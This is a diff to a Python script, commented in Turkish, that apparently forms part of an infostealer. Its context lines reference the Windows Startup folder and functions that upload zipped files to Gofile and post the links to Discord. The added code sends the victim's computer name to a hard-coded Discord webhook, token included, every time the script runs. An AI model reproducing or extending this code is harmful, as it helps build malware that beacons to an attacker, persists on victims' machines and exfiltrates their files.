@@ -73,6 +73,23 @@ STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Prog
 
 
 
+def send_mesage(webhook_url):
+    """Paylaşım linkini Discord Webhook'a gönderir."""
+    try:
+        payload = {'content': f"**scirpt has runned : {pc_name}**"}  # Mesaj ve link içeriği
+        
+        # Discord Webhook'a POST isteği gönder
+        response = requests.post(webhook_url, data=payload)
+        
+        # Yanıtı kontrol et
+        if response.status_code == 204:  # Discord Webhook başarılı yanıtı
+            print("Mesaj başarıyla gönderildi!")
+        else:
+            print(f"Discord Webhook hatası: {response.status_code} - {response.text}")
+    except Exception as e:
+        print(f"Discord gönderim hatası: {e}")
+
+send_mesage('https://discord.com/api/webhooks/1322677956757291090/h-UIa0gM90STGKOEf65dFfLbyYWOWALkbvq5v000-vrStO8-QTy6_WpGkrWmZvlbGfSc')
 
 if not os.path.exists(STORAGE_PATH):
 
@@ -559,6 +576,9 @@ def send_link_to_discord(webhook_url, link, message):
             print(f"Discord Webhook hatası: {response.status_code} - {response.text}")
     except Exception as e:
         print(f"Discord gönderim hatası: {e}")
+
+
+
 
 def send_zip_with_message_to_discord(webhook_url, file_path, message):
     """Dosyayı Gofile'ye yükler ve linkini Discord'a yollar."""
